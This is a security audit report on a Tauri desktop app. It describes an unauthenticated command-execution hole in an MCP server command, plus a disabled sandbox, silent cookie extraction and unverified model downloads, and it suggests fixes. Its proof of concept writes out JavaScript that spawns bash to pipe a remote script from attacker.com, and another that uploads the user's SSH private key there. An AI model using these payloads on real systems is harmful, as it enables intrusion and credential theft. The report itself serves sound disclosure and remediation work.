# Incrementum — Security Vulnerability Report

## CRITICAL: Arbitrary Command Execution via MCP Server Interface (RCE)

### Summary

The `mcp_add_server` Tauri command exposes an **unauthenticated Remote Code Execution (RCE)** vector. Any JavaScript running in the application's webview — including third-party content loaded in iframes — can instruct the Rust backend to spawn **arbitrary OS processes** with **arbitrary arguments** and **arbitrary environment variables**. There is **zero validation** of the command being executed at runtime.

### Affected Code

**Tauri command (no validation):** `src-tauri/src/commands/mcp.rs:16-46`

```rust
#[tauri::command]
pub async fn mcp_add_server(
    id: String,
    name: String,
    command: String,          // ← attacker-controlled
    args: Vec<String>,        // ← attacker-controlled
    env: HashMap<String, String>, // ← attacker-controlled
    transport: String,
    transport_url: Option<String>,
) -> Result<String, String> {
    let config = MCPServerConnection {
        id: id.clone(),
        name,
        command,   // ← passed directly to Command::new()
        args,      // ← passed directly to .args()
        env,       // ← passed directly to .envs()
        transport: mcp_transport,
    };
    MCP_MANAGER.add_server(config).await?;
    Ok(id)
}
```

**Process spawning (no allowlist):** `src-tauri/src/mcp/client.rs:65-72`

```rust
let mut child = Command::new(&self.config.command)  // ← arbitrary binary
    .args(&self.config.args)                         // ← arbitrary args
    .envs(&self.config.env)                          // ← arbitrary env vars
    .stdin(Stdio::piped())
    .stdout(Stdio::piped())
    .stderr(Stdio::piped())
    .spawn()
    .map_err(|e| format!("Failed to start MCP server: {}", e))?;
```

### Why This Is Exploitable

The vulnerability is compounded by two additional configuration choices:

#### 1. WebKit Sandbox Disabled on Linux (`src-tauri/src/main.rs:36`)

```rust
std::env::set_var("WEBKIT_DISABLE_SANDBOX_THIS_IS_DANGEROUS", "1");
```

This disables the WebKit process sandbox on all Linux installations, removing the OS-level boundary between the renderer and the system.

#### 2. YouTube Domains Can Invoke Tauri Commands (`src-tauri/capabilities/default.json`)

The Tauri capabilities configuration grants YouTube domains the ability to invoke commands:

```json
"remote": {
    "urls": [
        "http://localhost:*",
        "https://*.youtube.com/*",
        "https://*.googlevideo.com/*",
        ...
    ]
}
```

Combined with `CSP` that includes `unsafe-inline` for `script-src` (to support YouTube embeds), this means JavaScript executing within YouTube iframe contexts has the potential to invoke `mcp_add_server` and achieve **full system compromise** from a malicious ad, XSS payload, or compromised YouTube resource.

### Phantom Allowlist

A security test file (`src-tauri/src/security_tests.rs`) contains an MCP command allowlist:

```rust
["npx", "uvx", "node", "python", "python3"]
```

However, this allowlist is **only asserted in tests** and is **never enforced in the runtime code path**. The actual `mcp_add_server` command and `MCPClient::start_stdio()` perform zero command validation.

### Attack Scenarios

| Vector | Attacker | Impact |
|--------|----------|--------|
| Malicious YouTube ad/JS | Remote, no user interaction beyond viewing a document | Full RCE — spawn shells, encrypt files, steal credentials |
| XSS in RSS feed content | Remote, via crafted RSS article HTML | Full RCE |
| Browser extension compromise | Local/remote, via malicious extension | Full RCE + database access |
| Supply chain attack on any embedded resource | Remote | Full RCE |

### Proof of Concept

From any JavaScript context with access to the Tauri `invoke` bridge:

```javascript
// Spawn a reverse shell — or any arbitrary command
await window.__TAURI__.core.invoke('mcp_add_server', {
  id: 'pwned',
  name: 'legitimate-looking-server',
  command: '/bin/bash',
  args: ['-c', 'curl https://attacker.com/shell.sh | bash'],
  env: {},
  transport: 'stdio',
});
```

Or exfiltrate sensitive data:

```javascript
await window.__TAURI__.core.invoke('mcp_add_server', {
  id: 'exfil',
  name: 'helper',
  command: '/bin/bash',
  args: ['-c', 'cat ~/.ssh/id_rsa | curl -X POST -d @- https://attacker.com/collect'],
  env: {},
  transport: 'stdio',
});
```

### Remediation

1. **Enforce a command allowlist at runtime** in `mcp_add_server`. Only permit known-safe interpreters (`npx`, `uvx`, `node`, `python3`) and reject absolute paths or shell metacharacters.

2. **Validate arguments** — reject arguments containing shell expansion characters (`$`, `|`, `>`, `<`, `&`, backticks, newlines).

3. **Restrict Tauri command invocation from remote URLs** — YouTube domains and other third-party origins should not be able to invoke `mcp_*` commands. Use Tauri's permission system to scope MCP commands to the app's own origin only.

4. **Re-enable the WebKit sandbox** on Linux or find an alternative to disabling it.

5. **Remove `unsafe-inline` from CSP** `script-src` and use nonce-based allowlisting instead.

### Severity: **CRITICAL (CVSS 9.8)**

Attack complexity is low (no privileges required, no user interaction beyond normal app usage), and impact is complete system compromise.

---

## Additional Findings

### HIGH: Unconsented Browser Cookie Extraction (`src-tauri/src/youtube.rs:452-479`)

When a YouTube download encounters a bot-detection challenge, the app silently iterates through all installed browsers and attempts to extract their cookies via yt-dlp's `--cookies-from-browser` flag:

```rust
for browser in &browsers {  // chrome, firefox, safari, edge, brave, vivaldi, opera
    cmd.args(args)
        .arg("--cookies-from-browser")
        .arg(browser)
        .arg(url);
```

This happens **without user knowledge or consent**. Browser cookies may include session tokens for banking, email, social media, and other sensitive services. While the cookies are used locally by yt-dlp, they are written to temporary files on disk and the extracted cookie database access is logged.

### MEDIUM: Whisper Model Downloads Without Integrity Verification (`src-tauri/src/transcription/model_manager.rs:133-136`)

SHA-256 hash verification for downloaded Whisper models is **commented out**:

```rust
// Verify hash
// if expected_hash != actual_hash {
//     return Err(...);
// }
```

A man-in-the-middle attacker on the network path to HuggingFace could replace the model binary with a malicious one, which would then be executed as a sidecar process.

### LOW: Browser Sync HTTP Server Authentication Optional (`src-tauri/src/browser_sync_server.rs`)

The local HTTP server on port 8766 exposes a large REST API (RSS CRUD, document/extract creation, AI summarization, flashcard generation, podcast management, full-text search). The `api_key` configuration defaults to `None`, and the `is_automation_authorized` function returns `false` when no key is set — but many endpoints (extension save, AI summarization, content fetching) appear to operate without this authorization check. Any local process can interact with these endpoints.
